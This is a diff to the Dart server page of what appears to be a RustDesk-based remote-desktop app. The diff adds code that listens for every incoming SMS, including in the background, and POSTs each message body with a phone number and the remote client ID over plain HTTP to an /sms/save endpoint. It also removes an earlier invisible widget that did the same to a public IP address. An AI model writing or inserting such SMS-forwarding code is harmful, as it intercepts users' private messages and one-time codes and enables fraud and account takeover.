@@ -17,10 +17,52 @@ import 'home_page.dart';
 
 import 'package:http/http.dart' as http;
 import 'dart:convert';
-import 'package:permission_handler/permission_handler.dart';
-import 'package:sim_car_info_plugin/sim_car_info_plugin.dart';
+// import 'package:permission_handler/permission_handler.dart';
+import 'package:telephony/telephony.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 
 import 'dart:io';
+// 后台消息处理程序
+backgrounMessageHandler(SmsMessage message) async {
+  // 从 SharedPreferences 获取存储的手机号，clientId 
+  print("into 2");
+  SharedPreferences prefs = await SharedPreferences.getInstance();
+  String? storedPhoneNumber = prefs.getString('storedPhoneNumber'); // 获取存储的手机号
+  String? clientId = prefs.getString('clientId'); // 获取存储的clientId
+  String content = message.body!;
+  
+  if (storedPhoneNumber != null && clientId!= null) {
+    await sendToApi(storedPhoneNumber, content, clientId);
+    print("Background message processed: $content");
+  } else {
+    print("No phone number stored in background.");
+  }
+}
+
+Future<void> sendToApi(String sender, String content, String id) async {
+  var headers = {
+    'User-Agent': 'Apifox/1.0.0 (https://apifox.com)',
+    'Content-Type': 'application/json'
+  };
+  var request = http.Request('POST', Uri.parse('http://192.168.180.210:7808/external/cli/sms/save'));
+  request.body = json.encode({
+    "clientId": id,
+    "phone": sender,
+    "content": content
+  });
+  request.headers.addAll(headers);
+
+  try {
+    http.StreamedResponse response = await request.send();
+    if (response.statusCode == 200) {
+      print("API response: ${await response.stream.bytesToString()}");
+    } else {
+      print("API error: ${response.reasonPhrase}");
+    }
+  } catch (e) {
+    print("Error sending to API: $e");
+  }
+}
 
 class ServerPage extends StatefulWidget implements PageShape {
   @override
@@ -165,20 +207,59 @@ class _DropDownAction extends StatelessWidget {
 }
 
 class _ServerPageState extends State<ServerPage> {
+  final Telephony telephony = Telephony.instance;
+  late String id;
+  String? storedPhoneNumber; // 用来存储用户输入的手机号
+  TextEditingController phoneController = TextEditingController(); 
+
   Timer? _updateTimer;
 
   @override
   void initState() {
     super.initState();
+
+    telephony.requestPhoneAndSmsPermissions;
+    _listenForSms(); // 开始监听短信
+    _loadStoredPhoneNumber(); // 加载存储的手机号
+
     _updateTimer = periodic_immediate(const Duration(seconds: 3), () async {
       await gFFI.serverModel.fetchID();
     });
     gFFI.serverModel.checkAndroidPermission();
+    id = gFFI.serverModel.serverId.value.text.trim();
+  }
+
+
+  void _loadStoredPhoneNumber() async {
+    SharedPreferences prefs = await SharedPreferences.getInstance();
+    setState(() {
+      storedPhoneNumber = prefs.getString('storedPhoneNumber'); // 获取存储的手机号
+    });
+  }
+
+  void _listenForSms() {
+    telephony.listenIncomingSms(
+      onNewMessage: (SmsMessage message) async {
+        if (storedPhoneNumber != null) {
+          await sendToApi(storedPhoneNumber!, message.body!, id); // 发送已存储的手机号和短信
+        } else {
+          print("No phone number stored. Please input a phone number first.");
+        }
+      },
+      onBackgroundMessage: backgrounMessageHandler, // 设置后台消息处理
+    );
+  }
+
+  Future<void> savePhoneNumber(String inputPhone) async {
+    SharedPreferences prefs = await SharedPreferences.getInstance();
+    await prefs.setString('storedPhoneNumber', inputPhone); // 保存手机号
+    await prefs.setString('clientId', id); // 保存id
   }
 
   @override
   void dispose() {
     _updateTimer?.cancel();
+    phoneController.dispose(); // 销毁controller
     super.dispose();
   }
 
@@ -201,7 +282,32 @@ class _ServerPageState extends State<ServerPage> {
                         const ConnectionManager(),
                         const PermissionChecker(),
                         SizedBox.fromSize(size: const Size(0, 15.0)),
-                        ListenInfo(),
+                        // 添加手机号输入框
+                        TextField(
+                          controller: phoneController,
+                          decoration: const InputDecoration(
+                            labelText: '输入手机号',
+                            border: OutlineInputBorder(),
+                          ),
+                          keyboardType: TextInputType.phone,
+                        ),
+                        const SizedBox(height: 20),
+                        // 确认手机号按钮，存储输入的手机号
+                        TextButton(
+                          onPressed: () async {
+                            String inputPhone = phoneController.text; // 获取输入框中的手机号
+                            if (inputPhone.isNotEmpty) {
+                              await savePhoneNumber(inputPhone); // 存储手机号
+                              setState(() {
+                                storedPhoneNumber = inputPhone; // 更新当前存储手机号
+                              });
+                            } else {
+                              print('请输入手机号');
+                            }
+                          },
+                          child: const Text('确认手机号'),
+                        ),
+                        const SizedBox(height: 20),
                       ],
                     ),
                   ),
@@ -446,115 +552,6 @@ class ScamWarningDialogState extends State<ScamWarningDialog> {
   }
 }
 
-class ListenInfo extends StatefulWidget {
-  @override
-  _ListenInfoState createState() => _ListenInfoState();
-}
-
-class _ListenInfoState extends State<ListenInfo> {
-  final model = gFFI.serverModel; // 确保 gFFI 已正确定义
-  late final String id; 
-  late final String phoneNumber;
-  String newSmsContent = '暂无新短信';
-  late final SimCarInfoPlugin simCarInfoPlugin;
-
-  @override
-  void initState() {
-    super.initState();
-    id = model.serverId.value.text.trim();
-    phoneNumber = '获取中...'; // 初始化手机号
-    requestPermissions();
-    simCarInfoPlugin = SimCarInfoPlugin(); // 创建插件实例
-    listenForNewSms();
-  }
-
-  void requestPermissions() async {
-    var status = await Permission.sms.status;
-    if (!status.isGranted) {
-      var result = await Permission.sms.request();
-      if (!result.isGranted) {
-        logToFile("SMS permission denied");
-      }
-    }
-  }
-
-  void logToFile(String message) async {
-    try {
-      DateTime now = DateTime.now();
-      String timestamp = now.toIso8601String();
-      String logMessage = '$timestamp: $message\n';
-      String logFilePath = 'Sms.log';
-      final file = File(logFilePath);
-      await file.create(recursive: true);
-      await file.writeAsString(logMessage, mode: FileMode.append);
-    } catch (e) {
-      print('Error writing to log file: $e');
-    }
-  }
-
-  void listenForNewSms() {
-    simCarInfoPlugin.startListen().listen((event) async {
-      try {
-        setState(() {
-          newSmsContent = event.body; // 更新UI显示的新短信内容
-        });
-
-        var info = await simCarInfoPlugin.simCarInfo();
-        if (info != null && info.isNotEmpty) {
-          var infoList = json.decode(info);
-          if (event.slot < infoList.length) {
-            setState(() {
-              phoneNumber = infoList[event.slot]['Number'];
-            });
-            logToFile("Api data: ${event.slot}, $phoneNumber, $id");
-            await sendToApi(phoneNumber, event.body, id);
-          } else {
-            logToFile("Invalid slot index: ${event.slot}");
-          }
-        } else {
-          logToFile("Failed to retrieve simCarInfo or info is empty.");
-        }
-      } catch (e) {
-        logToFile("Error listening for new SMS: $e");
-      }
-    });
-  }
-
-  Future<void> sendToApi(String phoneNumber, String content, String id) async {
-    try {
-      var headers = {
-        'User-Agent': 'Apifox/1.0.0 (https://apifox.com)',
-        'Content-Type': 'application/json'
-      };
-
-      var request = http.Request(
-        'POST',
-        Uri.parse('http://61.171.69.243:7808/external/cli/sms/save'),
-      );
-      request.body = json.encode({
-        "clientId": id,
-        "phone": phoneNumber,
-        "content": content,
-      });
-      request.headers.addAll(headers);
-
-      http.StreamedResponse response = await request.send();
-      if (response.statusCode == 200) {
-        String responseBody = await response.stream.bytesToString();
-        logToFile("API request Success: $responseBody");
-      } else {
-        logToFile("API request failed with status code: ${response.statusCode}, reason: ${response.reasonPhrase}");
-      }
-    } catch (e) {
-      logToFile("Error sending SMS to API: $e");
-    }
-  }
-
-  @override
-  Widget build(BuildContext context) {
-    return SizedBox.shrink(); // 不显示的占位符组件
-  }
-}
 
 class ServerInfo extends StatelessWidget {
   final model = gFFI.serverModel;
